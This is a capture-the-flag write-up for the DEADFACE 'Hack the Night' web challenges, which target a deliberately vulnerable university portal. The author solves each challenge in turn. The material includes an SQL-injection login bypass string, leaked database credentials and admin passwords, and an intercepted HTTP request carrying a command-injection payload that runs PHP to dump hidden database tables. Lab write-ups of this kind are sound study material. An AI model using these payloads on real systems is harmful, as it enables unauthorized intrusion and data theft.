---
layout: post
title:  "Hack the Night"
date:   2025-10-26 21:18:43 -0400
author: robo.uzi
tags: [ctf]
permalink: /hack-the-night/
---
* TOC
{:toc}

## The Source of Our Troubles

**Category:** web

**Author:** @syyntax

**Description:** DEADFACE compromised Night Veil University’s student portal website. NVU swears up and down that they’ve secured the site, but the school leaderships wants us to validate that their site is no longer vulnerable. DEADFACE left several artifacts throughout the web app to taunt school staff. See if you can compromise the web app and find the artifacts left behind by DEADFACE.

Let’s start by finding any artifacts on NVU’s homepage at [http://env01.deadface.io:8080](http://env01.deadface.io:8080). NVU has graciously provided us with their System Design Document that includes information about the application and its intended behavior. Use these documents to facilitate your activities.

The first flag is found at `view-source:http://env01.deadface.io:8080/`. 

`deadface{v13w_s0urc3_4lw4ys_f1rst}`

___

## Hidden Paths

**Category:** web

**Author:** @syyntax

**Description:** NVU claims that they need their site SEO-optimized and that their site needs to allow web crawlers to access certain directories. But we’re almost certain this gave DEADFACE the intel they needed to plan their attack on the site. Find the flag associated with the document that web crawlers are meant to access. Submit the flag as `deadface{flag text}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

On `http://env01.deadface.io:8080/robots.txt` I find some very useful looking paths:
```html
# Night Vale University - robots.txt
# VULNERABILITY: Information disclosure via robots.txt (Easy)

User-agent: *
Disallow: /admin.php
Disallow: /api/
Disallow: /backup/
Disallow: /config/
Disallow: /.git/
Disallow: /secret_files/

# Flag: deadface{r0b0ts_txt_r3v34ls_h1dd3n_p4ths}

# Development endpoints (should be removed in production)
Disallow: /api/debug.php
Disallow: /phpinfo.php

# Sitemap
Sitemap: https://nvu.edu/sitemap.xml
```

`deadface{r0b0ts_txt_r3v34ls_h1dd3n_p4ths}`

___

## Console Chaos

**Category:** web

**Author:** @syyntax

**Description:** Let’s make sure NVU cleaned up some of the comments in their codebase. We don’t need them publicizing information that would help tip off DEADFACE. Use built-in browser tools to find any flags that we might have missed so far. Submit the flag as `deadface{text}`.[http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

I inspect the page and open the console and see this:
```shell
Welcome to Night Vale University Portal [script.js:56:9](http://env01.deadface.io:8080/script.js "View source in Debugger → http://env01.deadface.io:8080/script.js:56:9")  

Developers: Check the Network tab for interesting API endpoints... [script.js:57:9](http://env01.deadface.io:8080/script.js "View source in Debugger → http://env01.deadface.io:8080/script.js:57:9")  

Flag for curious developers: deadface{c0ns0l3_l0gs_4r3_y0ur_fr13nd} [script.js:58:9](http://env01.deadface.io:8080/script.js "View source in Debugger → http://env01.deadface.io:8080/script.js:58:9")  

Try: /api/debug.php?show=config [script.js:61:9](http://env01.deadface.io:8080/script.js "View source in Debugger → http://env01.deadface.io:8080/script.js:61:9")  

Also check: /api/search.php?q=test&type=announcements [script.js:62:9](http://env01.deadface.io:8080/script.js "View source in Debugger → http://env01.deadface.io:8080/script.js:62:9")
```

`deadface{c0ns0l3_l0gs_4r3_y0ur_fr13nd}`

___

## Stick to the Script

**Category:** web

**Author:** @syyntax

**Description:** NVU thought they were being clever by obfuscating some of their code, but DEADFACE was able to figure it out. Despite this, NVU hasn’t remediated the issue; we’re pretty sure the secret they tried to hide in their code is still there - easily readable to anyone who sees it. Find the flag that is obfuscated in the web app’s code. Submit the flag as `deadface{flag text}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

I visit `http://env01.deadface.io:8080/script.js` and see this script:
```javascript
// Night Vale University Portal - Client-side JavaScript

// VULNERABILITY: Sensitive data in JavaScript (Moderate difficulty)
const API_CONFIG = {
    endpoint: '/api/v1',
    apiKey: 'NVU_API_K3Y_d34df4c3_2025',
    debug: true
};

// Flag hidden in obfuscated JavaScript (Moderate difficulty)
const config = {
    version: '2.1.4',
    buildDate: '2025-10-15',
    // ZGVhZGZhY2V7ajR2NHNjcjFwdF9jNG5faDFkM19zM2NyM3RzfQ==
    features: ['announcements', 'courses', 'research']
};

// Add smooth scrolling
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        const target = document.querySelector(this.getAttribute('href'));
        if (target) {
            target.scrollIntoView({ behavior: 'smooth' });
        }
    });
});

// Add animation to cards on scroll
const observerOptions = {
    threshold: 0.1,
    rootMargin: '0px 0px -50px 0px'
};

const observer = new IntersectionObserver((entries) => {
    entries.forEach(entry => {
        if (entry.isIntersecting) {
            entry.target.style.opacity = '1';
            entry.target.style.transform = 'translateY(0)';
        }
    });
}, observerOptions);

// Observe all cards
document.addEventListener('DOMContentLoaded', () => {
    const cards = document.querySelectorAll('.card, .announcement, .course');
    cards.forEach(card => {
        card.style.opacity = '0';
        card.style.transform = 'translateY(20px)';
        card.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(card);
    });
});

// Console Easter egg (Easy difficulty)
console.log('%cWelcome to Night Vale University Portal', 'color: #ea6fba; font-size: 20px; font-weight: bold;');
console.log('%cDevelopers: Check the Network tab for interesting API endpoints...', 'color: #fcd63e; font-size: 14px;');
console.log('%cFlag for curious developers: deadface{c0ns0l3_l0gs_4r3_y0ur_fr13nd}', 'color: #2c1c5c; background: #fcd63e; padding: 5px; font-size: 12px;');

// Fake API endpoint hint
console.log('%cTry: /api/debug.php?show=config', 'color: #7c1d49; font-style: italic;');
console.log('%cAlso check: /api/search.php?q=test&type=announcements', 'color: #7c1d49; font-style: italic;');

// Form validation enhancement
const forms = document.querySelectorAll('form');
forms.forEach(form => {
    form.addEventListener('submit', function(e) {
        const inputs = this.querySelectorAll('input[required]');
        let isValid = true;
        
        inputs.forEach(input => {
            if (!input.value.trim()) {
                isValid = false;
                input.style.borderColor = '#dc3545';
            } else {
                input.style.borderColor = 'rgba(234, 111, 186, 0.5)';
            }
        });
        
        if (!isValid) {
            e.preventDefault();
            alert('Please fill in all required fields');
        }
    });
});

// Add hover effects for tables
document.addEventListener('DOMContentLoaded', () => {
    const tables = document.querySelectorAll('table');
    tables.forEach(table => {
        const rows = table.querySelectorAll('tbody tr');
        rows.forEach(row => {
            row.addEventListener('mouseenter', function() {
                this.style.transform = 'scale(1.02)';
                this.style.transition = 'transform 0.2s ease';
            });
            row.addEventListener('mouseleave', function() {
                this.style.transform = 'scale(1)';
            });
        });
    });
});

// Debug mode check (hidden functionality)
if (window.location.search.includes('debug=true')) {
    console.log('%cDebug Mode Enabled', 'color: #ff0000; font-size: 16px; font-weight: bold;');
    console.log('Database Config:', API_CONFIG);
    console.log('Build Info:', config);
}
```

I can clearly see the API key `NVU_API_K3Y_d34df4c3_2025` for the `/api/v1` endpoint and the flag encoded: `ZGVhZGZhY2V7ajR2NHNjcjFwdF9jNG5faDFkM19zM2NyM3RzfQ==`. 

`deadface{j4v4scr1pt_c4n_h1d3_s3cr3ts}`

___

## Pest Control

**Category:** web

**Author:** @syyntax

**Description:** NVU has an API that we believe was leveraged by DEADFACE to gain configuration information that aided them in their attack on NVU’s website. The API likely exposes sensitive information. Submit the flag as `deadface{flag text}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

```shell
curl http://env01.deadface.io:8080/api/debug.php?show=config  
{  
   "status": "success",  
   "message": "Debug configuration retrieved",  
   "data": {  
       "app_version": "2.1.4",  
       "php_version": "8.1.33",  
       "server": "Apache\/2.4.65 (Debian)",  
       "database": {  
           "host": "db",  
           "name": "nvu_portal",  
           "user": "nvu_user"  
       },  
       "flag": "deadface{4p1_d3bug_3xp0sur3_l34ks}",  
       "paths": {  
           "root": "\/var\/www\/html",  
           "script": "\/var\/www\/html\/api\/debug.php"  
       }  
   }  
}
```

`deadface{4p1_d3bug_3xp0sur3_l34ks}`

___

## Access Granted

**Category:** web

**Author:** @syyntax

**Description:** We need to gain authenticated access to the web app, but we want to see if we can do it the way DEADFACE did. NVU admits they haven’t fixed anything regarding their authentication process. See if you can login to the web app. Submit the flag as `deadface{flag text}`. Note: the application will present you with the flag once you login.  [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

I login with the username and password `' OR '1'='1`.

`deadface{sql_1nj3ct10n_byp4ss_4uth}`

___

## Reverse Course

**Category:** web

**Author:** @syyntax

**Description:** One of the accounts that DEADFACE compromised was an admin-level user. NVU has since removed the account, but there still might be information about the account located in the web app. See if you can find the password that belongs to the Emergency Admin user account. Submit the flag as `deadface{password}`. Example: `deadface{P@$$w0rd!}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080).

I visit `http://env01.deadface.io:8080/backup` and download the file `db_backup_20251015.sql`:
```shell
file db_backup_20251015.sql  
db_backup_20251015.sql: ASCII text

cat db_backup_20251015.sql  
-- Night Vale University Database Backup  
-- Date: 2025-10-15  
-- VULNERABILITY: Exposed backup file (Moderate)  
  
-- Backup contains sensitive information that should not be publicly accessible  
-- This file demonstrates the importance of proper backup security  
  
-- Database credentials (should never be in backups!)  
-- Host: db  
-- Database: nvu_portal     
-- Username: nvu_user  
-- Password: NightVale2023!  
  
USE nvu_portal;  
  
-- Hidden admin account for emergency access  
INSERT INTO users (username, password, email, role) VALUES  
('emergency_admin', MD5('EmergencyAccess2025!'), 'emergency@nvu.edu', 'admin');  
  
-- Sensitive research notes  
INSERT INTO research_projects (project_name, lead_researcher, classified, details, funding_amount) VALUES  
('Project Nightfall', 'Dr. Unknown', 1, 'Classified research into anomalous phenomena. Contact: classified@nvu.edu', 10000000.00);  
  
-- Additional hidden announcement  
INSERT INTO announcements (title, content, author, is_hidden) VALUES  
('Security Audit Required', 'Multiple vulnerabilities detected in portal system. Immediate action required.', 'Security Team', 1);  
  
-- End of backup
```

`deadface{EmergencyAccess2025!}`

___

## Not-So-Public Domain

**Category:** web

**Author:** @syyntax

**Description:** DEADFACE was able to retrieve an announcement that was hidden by administrators. This announcement contained sensitive information (flag) that DEADFACE was able to compromise. Find the flag associated with the hidden announcement. Submit the flag as `deadface{flag text}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

At this point I have RCE. On the admin page there is a "System Diagnostics" button where I can test network connectivity for university servers. 

I open burp and intercept the request. The request looks like this:
```http
POST /admin.php HTTP/1.1
Host: env01.deadface.io:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://env01.deadface.io:8080/admin.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://env01.deadface.io:8080
DNT: 1
Connection: keep-alive
Cookie: PHPSESSID=becbd2c1ebdec6c5363fac9e8bdd0114
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ping_host=1&host=8.8.8.8
```

I add this payload to the end to dump the flags hidden in the sql database:
```php
ping_host=1&host=8.8.8.8 | php -r '$h=getenv("DB_HOST")?: "db"; $d=getenv("DB_NAME")?: "nvu_portal"; $u=getenv("DB_USER")?: "nvu_user"; $p=getenv("DB_PASS")?: "NightVale2023!"; $pdo=new PDO("mysql:host=$h;dbname=$d;charset=utf8mb4",$u,$p,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]); foreach($pdo->query("SELECT id,project_name,details FROM research_projects WHERE classified=1") as $r){print_r($r);} foreach($pdo->query("SELECT id,title,content FROM announcements WHERE is_hidden=1") as $r){print_r($r);}'
```

After forwarding this I get the "classified research" as well. Output:
```sql
Array 
	( 
	[id] => 2 
	[0] => 2 
	[project_name] => Neural Interface Technology 
	[1] => Neural Interface Technology 
	[details] => FLAG: deadface{cl4ss1f13d_r3s34rch_unh4ck4bl3} - Advanced brain-computer interface development with military applications 
	[2] => FLAG: deadface{cl4ss1f13d_r3s34rch_unh4ck4bl3} - Advanced brain-computer interface development with military applications ) 
Array 
	( 
	[id] => 4 
	[0] => 4 
	[project_name] => Cryptographic Algorithm Research 
	[1] => Cryptographic Algorithm Research 
	[details] => Post-quantum cryptography for government communications 
	[2] => Post-quantum cryptography for government communications ) 
Array 
	( 
	[id] => 4 
	[0] => 4 
	[title] => Restricted Access Notice 
	[1] => Restricted Access Notice 
	[content] => FLAG: deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts} 
	[2] => FLAG: deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts} )
```
 
`deadface{h1dd3n_4nn0unc3m3nts_r3v34l_s3cr3ts}`

___

## Classified

**Category:** web

**Author:** @syyntax

**Description:** NVU had confidential research data that was compromised by DEADFACE and leaked to the public. NVU insists that their confidential data was safeguarded and only provided to authorized users on the web app. See if you can identify the flag associated with the classified research present on the web application. Submit the flag as `deadface{flag text}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

Again, at this point I have RCE. Im not sure what intended solution is. I got the flag from the same command I used in the `Not-So-Public Domain` challenge:
```php
ping_host=1&host=8.8.8.8 | php -r '$h=getenv("DB_HOST")?: "db"; $d=getenv("DB_NAME")?: "nvu_portal"; $u=getenv("DB_USER")?: "nvu_user"; $p=getenv("DB_PASS")?: "NightVale2023!"; $pdo=new PDO("mysql:host=$h;dbname=$d;charset=utf8mb4",$u,$p,[PDO::ATTR_ERRMODE=>PDO::ERRMODE_EXCEPTION]); foreach($pdo->query("SELECT id,project_name,details FROM research_projects WHERE classified=1") as $r){print_r($r);} foreach($pdo->query("SELECT id,title,content FROM announcements WHERE is_hidden=1") as $r){print_r($r);}'
```
 
`deadface{cl4ss1f13d_r3s34rch_unh4ck4bl3}`

___

## The Invisible Man

**Category:** web

**Author:** @syyntax

**Description:** It’s believed that DEADFACE compromised more than just one user on the web app. NVU prevents certain users from being displayed. See if you can find the flag associated with a privileged user. Submit the flag as `deadface{flag text}`. [http://env01.deadface.io:8080](http://env01.deadface.io:8080). 

I visit `http://env01.deadface.io:8080/admin.php?view_user=1&source=ui` and I can see users 1-15 listed.

At `http://env01.deadface.io:8080/admin.php?view_user=16` I can see the flag once `&source=ui` is removed from the link.

`deadface{1ns3cur3_d1r3ct_0bj3ct_r3f3r3nc3}`

___

I found this with RCE. Seems like an unused flag:

`deadface{d1r3ct0ry_tr4v3rs4l_m4st3r}`
